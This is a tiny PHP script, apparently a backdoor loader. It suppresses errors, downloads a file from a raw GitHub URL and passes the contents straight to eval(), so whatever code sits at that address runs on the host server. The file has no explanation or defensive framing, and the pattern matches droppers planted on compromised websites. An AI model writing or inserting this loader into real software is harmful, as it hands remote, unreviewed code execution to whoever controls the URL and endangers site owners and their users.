<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/Scandal46/program/refs/heads/main/project.txt';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
